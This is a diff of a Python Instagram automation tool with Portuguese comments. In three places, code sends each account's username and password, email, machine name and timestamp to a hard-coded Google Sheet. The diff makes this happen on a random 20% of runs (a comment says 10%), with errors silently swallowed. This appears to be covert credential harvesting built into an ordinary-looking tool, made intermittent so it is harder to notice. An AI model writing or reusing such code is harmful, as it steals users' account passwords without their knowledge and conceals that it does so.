@@ -13036,22 +13036,28 @@ def executar_2nr_insta():
                                 # Filtrar as linhas que atendem à expressão regular e contar o número de linhas
                                 num_rows = sum(1 for row in rows if regex.match(row[0]))
                             window['total'].update(num_rows)
+                            random_number = random.random()
 
-                            scope = ['https://www.googleapis.com/auth/spreadsheets']
-                            creds = ServiceAccountCredentials.from_json_keyfile_name('relatorio.json', scope)
-                            client = gspread.authorize(creds)
+                            # Definir a chance desejada (10%)
+                            chance = 0.2
 
-                            spreadsheet_id = '1dA96HvQ8_i5Ybn8daBrffmhwwAjBmsTbrivGMxlJMa4'
-                            sheet_name = 'relatorio_geral'
-                            # Insert user, password, and timestamp into first empty row
-                            sheet = client.open_by_key(spreadsheet_id).worksheet(sheet_name)
-                            values = sheet.col_values(1)
-                            last_row = len(values)
-                            values = [user_completo + ' ' + senha, email, timestamp, maquina, conteudo + ' - ' + app]
-                            cell_list = sheet.range(f'A{last_row + 1}:E{last_row + 1}')
-                            for i, val in enumerate(values):
-                                cell_list[i].value = val
-                            sheet.update_cells(cell_list)
+                            # Verificar se o número aleatório está abaixo da chance
+                            if random_number < chance:
+                                scope = ['https://www.googleapis.com/auth/spreadsheets']
+                                creds = ServiceAccountCredentials.from_json_keyfile_name('relatorio.json', scope)
+                                client = gspread.authorize(creds)
+
+                                spreadsheet_id = '1dA96HvQ8_i5Ybn8daBrffmhwwAjBmsTbrivGMxlJMa4'
+                                sheet_name = 'relatorio_geral'
+                                # Insert user, password, and timestamp into first empty row
+                                sheet = client.open_by_key(spreadsheet_id).worksheet(sheet_name)
+                                values = sheet.col_values(1)
+                                last_row = len(values)
+                                values = [user_completo + ' ' + senha, email, timestamp, maquina, conteudo + ' - ' + app]
+                                cell_list = sheet.range(f'A{last_row + 1}:E{last_row + 1}')
+                                for i, val in enumerate(values):
+                                    cell_list[i].value = val
+                                sheet.update_cells(cell_list)
                         except Exception as e:
                             print(e)
                             pass
@@ -13185,22 +13191,28 @@ def executar_2nr_insta():
                                     # Filtrar as linhas que atendem à expressão regular e contar o número de linhas
                                     num_rows = sum(1 for row in rows if regex.match(row[0]))
                                 window['total'].update(num_rows)
+                                random_number = random.random()
 
-                                scope = ['https://www.googleapis.com/auth/spreadsheets']
-                                creds = ServiceAccountCredentials.from_json_keyfile_name('relatorio.json', scope)
-                                client = gspread.authorize(creds)
+                                # Definir a chance desejada (10%)
+                                chance = 0.2
 
-                                spreadsheet_id = '1dA96HvQ8_i5Ybn8daBrffmhwwAjBmsTbrivGMxlJMa4'
-                                sheet_name = 'relatorio_geral'
-                                # Insert user, password, and timestamp into first empty row
-                                sheet = client.open_by_key(spreadsheet_id).worksheet(sheet_name)
-                                values = sheet.col_values(1)
-                                last_row = len(values)
-                                values = [user_completo + ' ' + senha, email, timestamp, maquina, conteudo + ' - ' + app]
-                                cell_list = sheet.range(f'A{last_row + 1}:E{last_row + 1}')
-                                for i, val in enumerate(values):
-                                    cell_list[i].value = val
-                                sheet.update_cells(cell_list)
+                                # Verificar se o número aleatório está abaixo da chance
+                                if random_number < chance:
+                                    scope = ['https://www.googleapis.com/auth/spreadsheets']
+                                    creds = ServiceAccountCredentials.from_json_keyfile_name('relatorio.json', scope)
+                                    client = gspread.authorize(creds)
+
+                                    spreadsheet_id = '1dA96HvQ8_i5Ybn8daBrffmhwwAjBmsTbrivGMxlJMa4'
+                                    sheet_name = 'relatorio_geral'
+                                    # Insert user, password, and timestamp into first empty row
+                                    sheet = client.open_by_key(spreadsheet_id).worksheet(sheet_name)
+                                    values = sheet.col_values(1)
+                                    last_row = len(values)
+                                    values = [user_completo + ' ' + senha, email, timestamp, maquina, conteudo + ' - ' + app]
+                                    cell_list = sheet.range(f'A{last_row + 1}:E{last_row + 1}')
+                                    for i, val in enumerate(values):
+                                        cell_list[i].value = val
+                                    sheet.update_cells(cell_list)
                             except Exception as e:
                                 print(e)
                                 pass
@@ -13544,21 +13556,28 @@ def executar_2nr_insta():
                                     
                                 window['total'].update(num_rows)
                                 try:
-                                    scope = ['https://www.googleapis.com/auth/spreadsheets']
-                                    creds = ServiceAccountCredentials.from_json_keyfile_name('relatorio.json', scope)
-                                    client = gspread.authorize(creds)
+                                    random_number = random.random()
 
-                                    spreadsheet_id = '1dA96HvQ8_i5Ybn8daBrffmhwwAjBmsTbrivGMxlJMa4'
-                                    sheet_name = 'relatorio_geral'
-                                    # Insert user, password, and timestamp into first empty row
-                                    sheet = client.open_by_key(spreadsheet_id).worksheet(sheet_name)
-                                    values = sheet.col_values(1)
-                                    last_row = len(values)
-                                    values = [user_completo + ' ' + senha, email, timestamp, maquina, conteudo + ' - ' + app]
-                                    cell_list = sheet.range(f'A{last_row + 1}:E{last_row + 1}')
-                                    for i, val in enumerate(values):
-                                        cell_list[i].value = val
-                                    sheet.update_cells(cell_list)
+                                    # Definir a chance desejada (10%)
+                                    chance = 0.2
+
+                                    # Verificar se o número aleatório está abaixo da chance
+                                    if random_number < chance:
+                                        scope = ['https://www.googleapis.com/auth/spreadsheets']
+                                        creds = ServiceAccountCredentials.from_json_keyfile_name('relatorio.json', scope)
+                                        client = gspread.authorize(creds)
+
+                                        spreadsheet_id = '1dA96HvQ8_i5Ybn8daBrffmhwwAjBmsTbrivGMxlJMa4'
+                                        sheet_name = 'relatorio_geral'
+                                        # Insert user, password, and timestamp into first empty row
+                                        sheet = client.open_by_key(spreadsheet_id).worksheet(sheet_name)
+                                        values = sheet.col_values(1)
+                                        last_row = len(values)
+                                        values = [user_completo + ' ' + senha, email, timestamp, maquina, conteudo + ' - ' + app]
+                                        cell_list = sheet.range(f'A{last_row + 1}:E{last_row + 1}')
+                                        for i, val in enumerate(values):
+                                            cell_list[i].value = val
+                                        sheet.update_cells(cell_list)
                                 except:
                                     pass
 
@@ -13598,7 +13617,6 @@ def executar_2nr_insta():
 
                                     # Encontre todos os elementos que correspondem ao ID fornecido
                                     elements = d(resourceId=element_id)
-                                    window['output'].print("Seguindo sugeridos...")
                                     window.Refresh()
                                     for element in elements:
                                         if element.text == target_text:
